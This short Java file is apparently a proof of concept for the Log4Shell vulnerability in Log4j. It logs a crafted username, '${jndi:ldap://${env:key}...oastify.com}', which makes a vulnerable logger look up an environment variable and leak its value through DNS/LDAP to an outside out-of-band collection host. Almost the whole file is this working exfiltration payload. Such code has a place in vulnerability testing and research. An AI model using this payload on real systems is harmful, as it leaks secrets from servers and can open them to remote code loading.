import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.layout.PatternLayout;

import java.util.function.LongFunction;

public class log4j2URL_DNS {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

        String username = "${jndi:ldap://${env:key}.1hj2a0litb8gvybwuy1m16vj8ae02p.oastify.com}";

        logger.info("User {} login in!", username);
    }
}
